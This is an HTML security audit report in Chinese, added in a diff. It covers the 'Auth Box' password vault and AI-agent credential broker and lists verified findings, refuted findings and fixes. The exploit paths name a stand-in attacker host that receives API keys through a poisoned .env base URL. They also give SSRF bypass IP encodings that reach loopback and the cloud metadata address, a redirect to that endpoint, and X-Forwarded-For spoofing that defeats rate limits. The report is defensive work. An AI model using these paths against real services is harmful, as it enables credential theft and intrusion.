@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<!-- generated-by: html-style-router | style-id: claude-warm-academic | swarm: code-quality-swarm -->
+<html lang="zh-CN" data-style-id="claude-warm-academic">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="generated-by" content="html-style-router">
+<title>Auth Box 发布前对抗式安全审计 · 2026-06-02</title>
+<style>
+  /* Style system: Claude Warm Academic Humanism (html-style-router) */
+  :root {
+    --page-max: 1040px;
+    --page-gutter: clamp(16px, 3vw, 48px);
+    --page-gutter-total: clamp(32px, 6vw, 96px);
+    --claude-paper: #FBF8F3;
+    --claude-ink: #2A2622;
+    --claude-accent: #B5703C;
+    --paper: var(--claude-paper);
+    --paper-2: #F4EEE4;
+    --card: #FFFFFF;
+    --border: #E9E0D2;
+    --ink: var(--claude-ink);
+    --ink-2: #6B6259;
+    --ink-3: #938877;
+    --accent: var(--claude-accent);
+    --accent-deep: #8A4F26;
+    --crit: #B3261E;
+    --high: #C2410C;
+    --med: #B45309;
+    --low: #5F6B45;
+    --info: #6B6259;
+    --refuted: #9AA0A6;
+    --ok: #4F6B3E;
+    --crit-bg: #FBEAE8;
+    --high-bg: #FBEDE3;
+    --med-bg: #FAF1DF;
+    --low-bg: #EFF1E7;
+    --refuted-bg: #F0F0EE;
+  }
+  * { box-sizing: border-box; }
+  html { -webkit-font-smoothing: antialiased; }
+  body {
+    margin: 0;
+    background: var(--paper);
+    color: var(--ink);
+    font-family: "Songti SC", "Source Han Serif SC", "Noto Serif SC", Georgia, "Times New Roman", serif;
+    line-height: 1.85;
+    font-size: 16.5px;
+  }
+  .html-frame {
+    width: min(var(--page-max), calc(100% - var(--page-gutter-total)));
+    margin-inline: auto;
+  }
+  .cover { background: linear-gradient(160deg, #F4EAD9 0%, #EFE3CF 60%, #E7D7BD 100%); padding: 0; border-bottom: 1px solid var(--border); }
+  .cover > .html-frame { padding-block: clamp(48px, 7vw, 88px); }
+  .eyebrow { font-family: "SF Mono", ui-monospace, Menlo, monospace; font-size: 12.5px; letter-spacing: .18em; text-transform: uppercase; color: var(--accent-deep); margin: 0 0 18px; }
+  h1.title { font-size: clamp(30px, 5vw, 46px); line-height: 1.22; margin: 0 0 14px; font-weight: 700; letter-spacing: -.01em; }
+  .subtitle { font-size: clamp(16px, 2.2vw, 19px); color: var(--ink-2); margin: 0 0 30px; max-width: 60ch; }
+  .meta-chips { display: flex; flex-wrap: wrap; gap: 10px; }
+  .chip { background: rgba(255,255,255,.62); border: 1px solid rgba(138,79,38,.22); color: var(--accent-deep); border-radius: 999px; padding: 6px 14px; font-size: 13px; font-family: "SF Mono", ui-monospace, Menlo, monospace; }
+  main.html-frame { padding-block: clamp(36px, 5vw, 60px); }
+  section { margin-bottom: clamp(36px, 5vw, 56px); }
+  h2 { font-size: clamp(22px, 3vw, 28px); margin: 0 0 8px; letter-spacing: -.01em; padding-bottom: 12px; border-bottom: 2px solid var(--accent); display: inline-block; }
+  h3 { font-size: 19px; margin: 28px 0 6px; color: var(--accent-deep); }
+  p { margin: 0 0 14px; }
+  .lead { font-size: 18px; color: var(--ink); }
+  ol.summary { counter-reset: s; list-style: none; padding: 0; margin: 18px 0 0; }
+  ol.summary > li { counter-increment: s; position: relative; padding: 14px 0 14px 50px; border-top: 1px solid var(--border); }
+  ol.summary > li:first-child { border-top: none; }
+  ol.summary > li::before { content: counter(s); position: absolute; left: 0; top: 13px; width: 30px; height: 30px; border-radius: 50%; background: var(--accent); color: #fff; font-family: "SF Mono", ui-monospace, monospace; font-size: 14px; display: grid; place-items: center; }
+  .tally { display: grid; grid-template-columns: repeat(6, 1fr); gap: 12px; margin-top: 22px; }
+  .tally .t { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 16px 12px; text-align: center; }
+  .tally .n { font-size: 30px; font-weight: 700; font-family: "SF Mono", ui-monospace, monospace; line-height: 1; }
+  .tally .l { font-size: 12.5px; color: var(--ink-2); margin-top: 8px; letter-spacing: .04em; }
+  .t.crit .n { color: var(--crit); } .t.high .n { color: var(--high); } .t.med .n { color: var(--med); }
+  .t.low .n { color: var(--low); } .t.info .n { color: var(--info); } .t.ref .n { color: var(--refuted); }
+  .badge { display: inline-block; font-family: "SF Mono", ui-monospace, monospace; font-size: 11.5px; font-weight: 600; padding: 2px 9px; border-radius: 6px; letter-spacing: .03em; vertical-align: middle; }
+  .b-crit { background: var(--crit-bg); color: var(--crit); }
+  .b-high { background: var(--high-bg); color: var(--high); }
+  .b-med { background: var(--med-bg); color: var(--med); }
+  .b-low { background: var(--low-bg); color: var(--low); }
+  .b-info { background: var(--refuted-bg); color: var(--info); }
+  .b-ref { background: var(--refuted-bg); color: var(--refuted); }
+  .b-ok { background: #EAF0E4; color: var(--ok); }
+  .finding { background: var(--card); border: 1px solid var(--border); border-left: 4px solid var(--accent); border-radius: 10px; padding: 20px 22px; margin: 16px 0; }
+  .finding.crit { border-left-color: var(--crit); }
+  .finding.high { border-left-color: var(--high); }
+  .finding .fh { display: flex; align-items: baseline; gap: 10px; flex-wrap: wrap; margin-bottom: 6px; }
+  .finding .fid { font-family: "SF Mono", ui-monospace, monospace; font-size: 13px; color: var(--ink-3); }
+  .finding .ft { font-size: 17.5px; font-weight: 700; }
+  .finding code, code.loc { font-family: "SF Mono", ui-monospace, Menlo, monospace; font-size: 13px; background: var(--paper-2); padding: 1px 6px; border-radius: 4px; color: var(--accent-deep); }
+  .finding .row { margin: 8px 0; }
+  .finding .k { font-size: 13px; color: var(--ink-3); letter-spacing: .04em; display: block; margin-bottom: 2px; }
+  table { width: 100%; border-collapse: collapse; margin: 16px 0; font-size: 14.5px; background: var(--card); border: 1px solid var(--border); border-radius: 10px; overflow: hidden; }
+  th, td { text-align: left; padding: 11px 14px; border-bottom: 1px solid var(--border); vertical-align: top; }
+  th { background: var(--paper-2); font-size: 12.5px; letter-spacing: .05em; color: var(--ink-2); text-transform: uppercase; font-weight: 600; }
+  tr:last-child td { border-bottom: none; }
+  td code { font-family: "SF Mono", ui-monospace, monospace; font-size: 12.5px; color: var(--accent-deep); }
+  .strike { text-decoration: line-through; color: var(--refuted); }
+  .callout { background: var(--paper-2); border: 1px solid var(--border); border-radius: 10px; padding: 18px 20px; margin: 18px 0; }
+  .callout.ok { background: #EFF3EA; border-color: #DBE4CF; }
+  .arrow { color: var(--refuted); font-family: "SF Mono", monospace; }
+  footer { text-align: center; padding: 60px 20px 44px; color: #9B9B9D; font-size: 13px; line-height: 2.2; border-top: 1px solid var(--border); margin-top: 30px; }
+  @media (max-width: 720px) { .tally { grid-template-columns: repeat(3, 1fr); } }
+</style>
+</head>
+<body>
+
+<header class="cover">
+  <div class="html-frame">
+    <p class="eyebrow">code-quality-swarm · 发布前对抗式安全审计</p>
+    <h1 class="title">Auth Box 发布前安全审计</h1>
+    <p class="subtitle">零知识密码保险库 + AI agent 授权中介（broker）的全量攻击者视角复核。6 个审查面并行扇出，每个高危/严重发现再经独立"反驳优先"验证者交叉核验。</p>
+    <div class="meta-chips">
+      <span class="chip">日期 2026-06-02</span>
+      <span class="chip">钉死提交 c2a72ce</span>
+      <span class="chip">只读审计 · 0 源码改动</span>
+      <span class="chip">15 agents · 258 tool calls</span>
+    </div>
+  </div>
+</header>
+
+<main class="html-frame">
+
+  <section>
+    <h2>执行摘要（结论先行）</h2>
+    <ol class="summary">
+      <li><strong>1 个 Critical（严重）发布阻断项，已验证为真：</strong>Provider（供应商）健康检查<strong>缺少目标域名白名单（allowlist）</strong>——导入攻击者构造的 <code class="loc">.env</code> 文件后点一次"验证"，就会把明文 API 密钥（API key）外泄到任意攻击者主机（<code>AUD-SSRF-01</code>）。这彻底击穿了守卫（guard）本身的目的，必须在分发前修复。</li>
+      <li><strong>3 个 High（高危），全部经验证者确认：</strong>SSRF 守卫可被 IPv6 与变体 IP 编码绕过、可达环回与云元数据端点（<code>AUD-SSRF-02</code>）；所有 API 限流（rate-limit）都基于可伪造的 <code>X-Forwarded-For</code>、无可信代理白名单（<code>AUD-AUTH-02</code>）；broker 审计哈希链能查出篡改/重排，<strong>却查不出尾部截断或整体删除</strong>，SEC-002 防篡改保证被夸大（<code>BROKER-AUDIT-01</code>）。</li>
+      <li><strong>对抗式验证者推翻了 4 个吓人的发现。</strong>web-extension（浏览器扩展）的 4 个"任意网页可驱动特权金库操作 / 窃取密码"的 Critical/High 报告<strong>全部被驳回</strong>：Chrome MV3 的消息隔离（无 <code>externally_connectable</code>、世界隔离、content script 不转发）阻断了所声称的"网页→后台"攻击路径。它们降级为潜在的防御纵深（defense-in-depth）缺口，而非可利用漏洞。如实呈现这一点，正是验证层的价值所在。</li>
+      <li><strong>核心密码学是稳健的。</strong>CSPRNG（密码学安全随机源）、AES-256-GCM nonce 唯一性、HD（分层确定性）密钥域分离、Argon2id 参数（256 MB / 3 轮）、SRP-6a 正确性与常数时间证明比较、以及服务端零知识不变量（只存/返/记加密块）——全部审计通过。本次发现都是关于<strong>完整性绑定、限流、SSRF、取证持久性</strong>，而非密码原语被攻破。</li>
+      <li><strong>净有效计数（验证后）：</strong>1 Critical · 3 High · 10 Medium · 3 Low · 1 Info · 4 已驳回（共 22 条原始发现）。</li>
+    </ol>
+    <div class="tally">
+      <div class="t crit"><div class="n">1</div><div class="l">Critical 严重</div></div>
+      <div class="t high"><div class="n">3</div><div class="l">High 高危</div></div>
+      <div class="t med"><div class="n">10</div><div class="l">Medium 中危</div></div>
+      <div class="t low"><div class="n">3</div><div class="l">Low 低危</div></div>
+      <div class="t info"><div class="n">1</div><div class="l">Info 提示</div></div>
+      <div class="t ref"><div class="n">4</div><div class="l">Refuted 已驳回</div></div>
+    </div>
+  </section>
+
+  <section>
+    <h2>主题综合（MECE 不重不漏）</h2>
+
+    <h3>A. SSRF / API 密钥外泄 —— Critical 集群（provider-hub）</h3>
+    <p><code class="loc">isSafeEndpoint</code>（CredentialHealth.swift:319-344）是一个<strong>黑名单（deny-list）</strong>——"非内网即安全"；而 openai/posthog/langfuse 探针把用户提供的 <code>base_url</code>/<code>host</code> 拼进 URL，并始终附带 <code>Authorization: Bearer &lt;api_key&gt;</code>。</p>
+
+    <div class="finding crit">
+      <div class="fh"><span class="badge b-crit">CRITICAL</span><span class="badge b-ok">VERIFIED 确认</span><span class="fid">AUD-SSRF-01</span></div>
+      <div class="ft">SSRF 守卫无供应商域名白名单 → 任意攻击者主机直接拿到 API 密钥</div>
+      <div class="row"><span class="k">位置</span><code class="loc">CredentialHealth.swift:319-344 / :101-107 / :360-368</code></div>
+      <div class="row"><span class="k">利用路径</span><code class="loc">https://evil.attacker.com/v1/models</code> 能通过守卫（既非环回也非私网）。导入含 <code>OPENAI_BASE_URL=https://evil.attacker.com/v1</code> 的 <code>.env</code> 后点一次"验证"，<code>check()→transport.send()</code> 全程无校验，真实 OpenAI 密钥随 Authorization 头发往攻击者服务器。验证者端到端复现，确认无任何缓解守卫。</div>
+      <div class="row"><span class="k">修复</span>黑名单改为<strong>正向白名单</strong>：解析出的 host 必须精确匹配（或属于）供应商的规范 API 域名；若需支持自托管 base_url，则要求每凭证显式确认目标 host 并在 UI 中展示密钥将发往何处。</div>
+    </div>
+
+    <div class="finding high">
+      <div class="fh"><span class="badge b-high">HIGH</span><span class="badge b-ok">VERIFIED 确认</span><span class="fid">AUD-SSRF-02</span></div>
+      <div class="ft">内网拦截可被 IPv6 与变体 IP 编码绕过（SEC-004 修复不完整）</div>
+      <div class="row"><span class="k">利用路径</span>验证者编译并运行真实守卫 + <code>getaddrinfo</code>：<code>[::ffff:127.0.0.1]</code>、<code>[0:0:0:0:0:0:0:1]</code>、<code>2130706433</code>、<code>0x7f000001</code>、<code>2852039166</code>(→169.254.169.254 元数据) 全部返回 ALLOW。四段十进制检查对这些形式不触发，IPv6 分支只匹配字面 <code>::1</code>。可达环回服务与云元数据端点。</div>
+      <div class="row"><span class="k">修复</span>不要手工解析 IP：解析 host 后用地址族的保留段检查拒绝非全局地址，展开 <code>::</code> 并解包 <code>::ffff:</code> IPv4-mapped 后再判定。若采纳 SSRF-01 的白名单则此项自然消解。</div>
+    </div>
+
+    <div class="finding">
+      <div class="fh"><span class="badge b-med">MEDIUM</span><span class="fid">AUD-SSRF-03</span></div>
+      <div class="ft">健康检查携密钥跟随 HTTP 重定向 —— 守卫只校验初始 URL</div>
+      <div class="row"><span class="k">利用路径</span><code class="loc">URLSession.shared</code> 默认跟随 3xx，初始 URL 通过守卫后，攻击者主机回 <code>302 Location: https://169.254.169.254/…</code>，密钥头随跨主机重定向继续发送；并启用 DNS rebinding（DNS 重绑定）TOCTOU。</div>
+      <div class="row"><span class="k">修复</span>装 <code>URLSessionTaskDelegate</code> 在每次重定向重跑守卫 + 白名单，跨源时剥离 Authorization/x-api-key 头；或健康探针直接禁止跟随重定向。</div>
+    </div>
+
+    <h3>B. 审计 / 取证完整性（broker + go-api）</h3>
+    <div class="finding high">
+      <div class="fh"><span class="badge b-high">HIGH</span><span class="badge b-ok">VERIFIED 确认</span><span class="fid">BROKER-AUDIT-01</span></div>
+      <div class="ft">审计哈希链能查篡改/重排，查不出尾部截断或删除 —— SEC-002 保证被夸大</div>
+      <div class="row"><span class="k">位置</span><code class="loc">AuditLog.swift:134-145 (verify) / 91-97 (load)</code></div>
+      <div class="row"><span class="k">利用路径</span><code>verify()</code> 只校验保留条目的链接关系，无期望长度/头哈希锚点。空链返回 true，任意合法前缀（截断后）也返回 true，UI 随即显示绿色"chain intact"。删除/截断 <code>audit-chain.jsonl</code> 可抹掉一次恶意"Allow"的记录而零防篡改信号。注释"any edit/truncation/reorder is caught"对截断/删除<strong>为假</strong>。</div>
+      <div class="row"><span class="k">修复</span>把 <code>(seq, head-hash)</code> 锚定到 Keychain/Secure Enclave，加载时强制匹配；空/短链不匹配即 <code>loadedIntegrityOK=false</code>。</div>
+    </div>
+    <table>
+      <tr><th>ID</th><th>等级</th><th>问题</th><th>修复方向</th></tr>
+      <tr><td><code>API-AUDIT-01</code></td><td><span class="badge b-med">MED</span></td><td>服务端 <code>AuditService.LogEvent</code> 是死代码（零调用点），审计行从不写入，<code>/audit/verify</code> 空链恒"valid"；哈希输入漏掉 user_id/metadata 且无 HMAC 密钥（有 DB 写权即可伪造一致链）。</td><td>把 LogEvent 接入安全相关流程；HMAC 加密链；哈希纳入 user_id/metadata。</td></tr>
+      <tr><td><code>AUD-DOS-01</code></td><td><span class="badge b-med">MED</span></td><td>限流在 token 鉴权<em>之后</em>才评估；未知/错 token 的拒绝仍同步写盘，本地进程可灌满 <code>audit-chain.jsonl</code>（耗尽磁盘 + 淹没真实事件）。</td><td>对未鉴权拒绝先限流/合并再落盘；文件大小封顶 + 轮转。</td></tr>
+    </table>
+
+    <h3>C. 鉴权限流与 2FA（go-api）</h3>
+    <div class="finding high">
+      <div class="fh"><span class="badge b-high">HIGH</span><span class="badge b-ok">VERIFIED 确认</span><span class="fid">AUD-AUTH-02</span></div>
+      <div class="ft">全部限流基于可伪造的 X-Forwarded-For，无可信代理白名单</div>
+      <div class="row"><span class="k">位置</span><code class="loc">middleware/security.go:103-115 (ClientIP)</code></div>
+      <div class="row"><span class="k">利用路径</span><code>ClientIP()</code> 无条件返回 XFF 最左项；两个限流器 + chi <code>RealIP</code> 都以此为键。每请求轮换 <code>X-Forwarded-For: 1.2.3.&lt;n&gt;</code> 即获新桶，per-IP 闸门归零。直接放大了 AUD-AUTH-01 的 TOTP 爆破。</div>
+      <div class="row"><span class="k">修复</span>仅当直连对端在配置的可信代理 CIDR 内才采信 XFF；否则用 <code>RemoteAddr</code>。可信时从右向左跳过可信跳数解析。</div>
+    </div>
+    <div class="finding">
+      <div class="fh"><span class="badge b-med">MEDIUM</span><span class="badge b-ref">↓ 从 HIGH 下调</span><span class="fid">AUD-AUTH-01</span></div>
+      <div class="ft">TOTP 第二因子可爆破：无 per-email 限流、无已用码追踪、失败不清 pending 态</div>
+      <div class="row"><span class="k">验证者判定</span>属实但下调为 Medium——<strong>前提是攻击者已持有主密码</strong>（SRP 秘密），故属 2FA 绕过 / 防御纵深失效，而非主凭证泄露。±1 步窗 = 30 秒内 3/1,000,000 个码有效；失败分支不删 pending 态，5 分钟窗内可无限猜。</div>
+      <div class="row"><span class="k">修复</span>per-pending 失败计数（N 次失败删 pending + 强制重做 SRP）+ 已用码存储 + 给 TOTP 路由套 per-email 限流。</div>
+    </div>
+
+    <h3>D. 密码学完整性绑定（crypto-ts）</h3>
+    <div class="finding">
+      <div class="fh"><span class="badge b-med">MEDIUM</span><span class="fid">AUD-CRYPTO-01</span></div>
+      <div class="ft">金库条目 AES-GCM 无 AAD 绑定 —— 被攻陷服务器可悄悄换块 / 回滚密文</div>
+      <div class="row"><span class="k">利用路径</span><code>encryptVaultItem/decryptVaultItem</code> 调 GCM 时不传 <code>additionalData</code>，密文不绑定 item id/type/vault/revision；而这些元数据由服务器以明文给出并被原样信任。被攻陷服务器（正是零知识要防的对手）可把 A 的密文挂到 B 的 id 下，或用更高伪造 revision 重放旧密文——GCM tag 仍校验通过，客户端在攻击者选定的身份下渲染攻击者选定的明文（凭证回滚 / 错站标签，诱导用户把真密码提交到错误目标）。</div>
+      <div class="row"><span class="k">修复</span>用 GCM AAD 绑定 item id（+type/vaultId）；加签名/MAC 的 revision 清单以抗回滚。</div>
+    </div>
+    <div class="finding">
+      <div class="fh"><span class="badge b-med">MEDIUM</span><span class="fid">AUD-CRYPTO-02</span></div>
+      <div class="ft">SRP 验证子由快速 SHA-256 直接派生 —— 泄露后离线爆破绕开 Argon2id 加固</div>
+      <div class="row"><span class="k">利用路径</span>验证子 = <code>H(salt‖H(email:password))</code>，纯 SHA-256，<strong>未走</strong>保护 enc/auth/mac 的 Argon2id。服务器库泄露（在场景内）后，持 (salt, verifier) 者每猜一次仅 ~2 次 SHA-256 + 1 次模幂，远低于预期 Argon2 成本。注释已声称"from auth key"——让实现与注释一致即可。</div>
+      <div class="row"><span class="k">修复</span>把口令先过同一 Argon2id，再用派生 authKey 计算验证子。</div>
+    </div>
+
+    <h3>E. 客户端 XSS 爆炸半径（web-extension）</h3>
+    <table>
+      <tr><th>ID</th><th>等级</th><th>问题</th><th>修复方向</th></tr>
+      <tr><td><code>AUD-EXT-05</code></td><td><span class="badge b-med">MED</span></td><td>web 客户端（静态 export）<strong>无 CSP</strong>；解密后的 vaultKey + 会话令牌驻留 JS 内存 → 任何 XSS（含依赖供应链）即崩塌零知识。</td><td>边缘/CDN 下发严格 CSP + SRI + 依赖审计门。</td></tr>
+      <tr><td><code>AUD-EXT-06</code></td><td><span class="badge b-med">MED</span></td><td>会话令牌存于 <code>sessionStorage</code>（XSS 可读），与布局自身"no sessionStorage"注释矛盾。</td><td>仅内存，或 httpOnly+Secure+SameSite cookie。</td></tr>
+      <tr><td><code>AUD-EXT-07</code></td><td><span class="badge b-med">MED</span></td><td>MCP 网关 <code>WebSocketServer({port})</code> 绑 0.0.0.0、升级时不校验 Origin —— 局域网可达的凭证 broker。</td><td>绑 <code>127.0.0.1</code> + Origin 白名单（对齐 macOS SEC-006 环回姿态）。</td></tr>
+    </table>
+
+    <h3>F. 密钥卫生与生成器正确性（macos + crypto-ts）</h3>
+    <table>
+      <tr><th>ID</th><th>等级</th><th>问题</th></tr>
+      <tr><td><code>AUD-POLICY-01</code></td><td><span class="badge b-med">MED</span></td><td>step-up 审批短路策略循环，审批后 item_scope/rate_limit/time_window 不再强制执行（默认配置不可利用，但 priority 是自由未校验 Int，经 sync/import 路径可变为可利用）。修复：step-up 改为"全部策略通过后才触发"的延迟门。</td></tr>
+      <tr><td><code>AUD-SE-VAULT-01</code></td><td><span class="badge b-low">LOW</span></td><td><code>provisionAndUnlock</code> 只清零 seed，syncKey/authKey/agentRootKey + 源 vaultKey 副本残留堆内存（<code>SeedKeyBundle</code> 用不可变 let）。修复：清零型 bundle API。</td></tr>
+      <tr><td><code>AUD-CRYPTO-03</code></td><td><span class="badge b-low">LOW</span></td><td><code>derivePassword</code> 静默截断 >128 字符的请求。修复：计数器模式扩展。</td></tr>
+      <tr><td><code>AUD-POLICY-02</code></td><td><span class="badge b-low">LOW</span></td><td>per-policy <code>approvalTimeoutSeconds</code> 被静默忽略，所有 step-up 用硬编码 60s。修复：把配置超时透传进 requestApproval。</td></tr>
+      <tr><td><code>AUD-CRYPTO-04</code></td><td><span class="badge b-info">INFO</span></td><td><code>derivePassword</code> 用有偏模映射，注释却称"rejection sampling"（熵损 ~0.01 bit/20 字符，可忽略）。修复：实现拒绝采样或更正注释。</td></tr>
+    </table>
+  </section>
+
+  <section>
+    <h2>已驳回发现（验证者推翻 —— 透明披露）</h2>
+    <p>web-extension 审计员报了 4 条以"恶意网页能触达后台消息路由"为前提的 Critical/High。独立验证者在 <code>c2a72ce</code> 处<strong>全部驳回</strong>：Chrome MV3 无 <code>externally_connectable</code>、content script 运行在隔离世界且不转发页面消息——所声称的网页攻击者路径不存在。</p>
+    <table>
+      <tr><th>ID</th><th>原始声称</th><th>驳回理由</th><th>残余</th></tr>
+      <tr><td class="strike">AUD-EXT-01</td><td>任意网页驱动特权操作（无 sender 校验）</td><td>无 externally_connectable；隔离世界；无 页面→content script 中继。缺失的 sender 校验属实但不可达。</td><td><span class="badge b-low">Low 加固</span></td></tr>
+      <tr><td class="strike">AUD-EXT-02</td><td>AUTOFILL 跨源窃取密码</td><td><code>AUTOFILL_REQUEST</code>/<code>SEARCH_ITEMS</code> 仅由 popup 发出；content script 只发 <code>FORM_DETECTED</code>；无传输页面指定 itemId 的通道。</td><td><span class="badge b-ref">none</span></td></tr>
+      <tr><td class="strike">AUD-EXT-03</td><td>SEARCH_ITEMS 向任意页面泄露全部登录元数据</td><td>同一传输阻断；<code>search('',undefined)</code> 返回全部是隐患但页面不可达。</td><td><span class="badge b-info">Info</span></td></tr>
+      <tr><td class="strike">AUD-EXT-04</td><td>UNLOCK_VAULT 远程爆破 oracle</td><td><code>runtime.onMessage</code> 仅收扩展上下文发送者；无中继 → 无远程 oracle。但缺失节流仍值得补。</td><td><span class="badge b-low">Low 加固</span></td></tr>
+    </table>
+    <p>这些字面代码观察（缺 sender 校验、autofill 无源绑定、unlock 无节流）是有效的<strong>加固项</strong>——一旦未来加入 <code>externally_connectable</code> 或页面消息中继即会变危险，但当下并非可利用漏洞。</p>
+  </section>
+
+  <section>
+    <h2>决策 / 后续行动（优先级修复队列）</h2>
+    <div class="callout">
+      <strong>提醒：</strong>本次审计<strong>不改动源码</strong>。编辑源码前需与本仓库<strong>并发会话</strong>协调——上一会话期间另一 agent 已提交 <code>30db413</code>/<code>c2a72ce</code>。在 macOS Swift 文件上并发写存在冲突风险。
+    </div>
+    <table>
+      <tr><th>#</th><th>优先级</th><th>发现</th><th>动作</th><th>门控</th></tr>
+      <tr><td>1</td><td><span class="badge b-crit">发布阻断</span></td><td>SSRF-01/02/03</td><td>健康检查目标域名白名单 + IP 规范化保留段拒绝 + 重定向/头剥离 delegate</td><td>7 种绕过编码全 BLOCK</td></tr>
+      <tr><td>2</td><td><span class="badge b-high">High</span></td><td>AUTH-02</td><td>XFF 可信代理 CIDR 白名单；默认 RemoteAddr</td><td>XFF 轮换不再重置桶</td></tr>
+      <tr><td>3</td><td><span class="badge b-high">High</span></td><td>BROKER-AUDIT-01</td><td>Keychain 锚定 (seq, head-hash)；加载拒绝空/前缀链</td><td>截断+删除测试 → integrityOK=false</td></tr>
+      <tr><td>4</td><td><span class="badge b-med">Med</span></td><td>CRYPTO-01</td><td>GCM AAD 绑定 item id/type/vaultId + 签名 revision 清单</td><td>换块/回滚测试 GCM tag 失败</td></tr>
+      <tr><td>5</td><td><span class="badge b-med">Med</span></td><td>AUTH-01 / API-AUDIT-01 / DOS-01</td><td>TOTP 失败计数+已用码；接入 LogEvent + HMAC 链；审计预鉴权限流</td><td>per-account TOTP 锁定测试；审计行落库</td></tr>
+      <tr><td>6</td><td><span class="badge b-med">Med</span></td><td>CRYPTO-02 / EXT-05/06/07 / POLICY-01</td><td>Argon2 派生 SRP 验证子；CSP+令牌卫生；WS 环回+Origin；step-up 延迟门</td><td>逐项单测</td></tr>
+      <tr><td>7</td><td><span class="badge b-low">Low/Info</span></td><td>SE-VAULT-01 / CRYPTO-03/04 / POLICY-02</td><td>清零 bundle；计数器扩展；透传超时；更正注释</td><td>单测</td></tr>
+    </table>
+    <div class="callout">
+      <strong>分发门控建议：</strong>仅在 #1（Critical）修复并重测后才放行分发；#2/#3 应同版落地；#4–#7 可作快速跟进（fast-follow）。
+    </div>
+  </section>
+
+  <section>
+    <h2>审计通过项（残余风险范围界定）</h2>
+    <div class="callout ok">
+      在 <code>c2a72ce</code> 处稳健：CSPRNG（<code>crypto.getRandomValues</code>）；AES-256-GCM 每次加密新 12 字节 nonce、无复用；HD 密钥域分离（hardened HMAC-SHA512）；Argon2id 256 MB/3 轮 + 每注册新 32 字节盐；SRP-6a RFC 5054 Group 14 + 常数时间 M2 比较；Secure Enclave <code>.biometryCurrentSet</code> + <code>WhenUnlockedThisDeviceOnly</code>（抗胁迫）；<code>noteActivity()</code> 仅人机 UI 可达（broker 流量无法重置自动锁 —— SEC-009 确认未受损）；broker bearer-token 常数时间 + 仅存哈希（SEC-001）；环回 IP 字面强制（SEC-006）；deny-by-default 策略引擎；服务端全量 IDOR 范围限定（每查询 <code>AND user_id=$N</code>）；pgx 参数化（无 SQLi）；服务端零知识不变量成立（只存/返/记加密块）；MCP 代理 SSRF 防御（<code>proxy-security.ts</code>）正是 macOS 守卫应当采用的正确范式。
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <p>Auth Box v0.1.0 — 发布前对抗式安全审计</p>
+  <p>Maurice | maurice_wen@proton.me</p>
+  <p style="font-size:12px; margin-top:8px;">2026-06-02 · 数据来源：只读对抗式审计 @ 提交 c2a72ce，6 个审查面，15 个 agent，每个高危/严重发现经独立验证</p>
+</footer>
+
+</body>
+</html>
